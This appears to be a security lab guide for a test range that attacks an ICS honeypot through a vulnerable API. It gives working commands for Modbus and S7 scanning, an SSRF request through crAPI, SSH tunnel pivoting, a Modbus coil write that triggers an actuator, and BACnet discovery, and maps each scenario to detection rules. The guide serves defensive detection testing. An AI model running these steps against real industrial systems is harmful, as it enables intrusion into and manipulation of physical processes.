# OT Targeting via API Pivot

These scenarios demonstrate the core iron-gate thesis: API compromise in an OT-adjacent
environment provides a pivot point to ICS protocols that defenders are not instrumented to catch.

## Prerequisites

- iron-gate-attacker: 10.0.0.101 (Kali)
- iron-gate-ot: 10.0.0.103 (Conpot — Modbus/S7/BACnet)
- iron-gate-api: 10.0.0.100 (crAPI — pivot host)

Install Modbus tools on attacker:
```bash
pip install pymodbus
apt-get install -y nmap
```

---

## Scenario 1: Direct OT Recon from Attacker

Baseline — attacker can directly see OT if on the same network.

```bash
# Modbus device scan
nmap -p 502 10.0.0.0/24 --open

# Read holding registers via pymodbus
python3 - <<'EOF'
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('10.0.0.103', port=502)
c.connect()
result = c.read_holding_registers(address=0, count=10, slave=1)
print("Registers:", result.registers)
c.close()
EOF

# S7comm probe
nmap -p 102 --script s7-info 10.0.0.103
```

**Point**: Conpot responds to raw ICS protocol queries with no authentication.

---

## Scenario 2: API-to-OT Pivot (SSRF Vector)

The API host (10.0.0.100) is on the same /24 as the OT host (10.0.0.103).
SSRF in crAPI can be used to reach internal services.

```bash
# From iron-gate-attacker, exploit SSRF in crAPI to probe OT host
TOKEN=$(curl -s -X POST http://10.0.0.100:8888/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@lab.local","password":"Attack@123"}' | jq -r '.token')

# Use mechanic API endpoint as SSRF vector
# This makes crAPI server fetch the URL — hitting internal OT host
curl -s -X POST http://10.0.0.100:8888/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"mechanic_api\": \"http://10.0.0.103:80\",
    \"problem_details\": \"test\",
    \"vin\": \"test\",
    \"mechanic_code\": \"TRAC_JME\"
  }"
```

**What this proves**: The API server makes requests on behalf of the attacker to internal hosts.
Even without RCE, SSRF gives the attacker visibility into the OT segment through the API host.

---

## Scenario 3: Post-Exploitation Pivot (Simulated RCE)

After achieving code execution on iron-gate-api (via any vector), attacker has
direct network access to OT host from a position inside the perimeter.

```bash
# SSH to attacker, then pivot through API host
ssh -i ~/.ssh/iron_gate kali@10.0.0.101

# Set up SSH tunnel through API host to OT host
ssh -i ~/.ssh/iron_gate -L 5502:10.0.0.103:502 ubuntu@10.0.0.100 -N &

# Now interact with Modbus through the tunnel
python3 - <<'EOF'
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('127.0.0.1', port=5502)
c.connect()
# Read coils (simulates reading sensor state)
coils = c.read_coils(address=0, count=8, slave=1)
print("Coils:", coils.bits)
# Write coil (simulates actuator manipulation)
c.write_coil(address=0, value=True, slave=1)
print("Coil 0 written: True (simulated actuator trigger)")
c.close()
EOF
```

**Detection trigger**: `ot-probe.yaml` → APIHostConnectingToOT fires when 10.0.0.100
appears in Conpot logs.

---

## Scenario 4: BACnet Discovery

```bash
# BACnet device discovery (UDP broadcast)
pip install BAC0
python3 - <<'EOF'
import BAC0
bacnet = BAC0.lite()
bacnet.whois()
import time; time.sleep(3)
print("Devices found:", bacnet.devices)
BAC0.stop()
EOF
```

---

## Detection Summary

| Scenario | Log Source | Loki Rule | Expected Alert |
|----------|-----------|-----------|---------------|
| Direct Modbus scan | conpot | ot-probe.yaml | ModbusConnectionFromUnknownHost |
| SSRF to OT | conpot | ot-probe.yaml | ModbusConnectionFromUnknownHost |
| Pivot via API host | conpot | ot-probe.yaml | APIHostConnectingToOT (critical) |
| S7 probe | conpot | ot-probe.yaml | S7CommDetected |
| Register flood | conpot | data-exposure.yaml | OTDataLeak |

The key differentiation between Scenario 1 (expected attacker traffic) and Scenario 3 (pivot)
is the source IP in Conpot logs: 10.0.0.101 vs 10.0.0.100.
The `APIHostConnectingToOT` rule specifically watches for the API server's IP.
